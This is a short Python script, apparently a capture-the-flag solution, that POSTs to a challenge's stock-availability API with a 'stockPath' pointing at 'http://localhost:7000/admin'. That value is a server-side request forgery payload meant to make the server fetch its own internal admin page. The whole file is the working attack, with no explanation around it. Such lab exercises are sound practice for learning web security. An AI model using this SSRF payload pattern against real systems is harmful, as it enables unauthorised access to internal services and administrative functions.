from req import request

url = "https://task1.ctf.sekangur.pl/api/store/check-availability"
payload = {
    "itemId": "\b",
    "stockPath": "http://localhost:7000/admin"
}

if __name__ == "__main__":
    code, text = request(url, method="POST", payload=payload)
    print(f"{code} -> {text}")
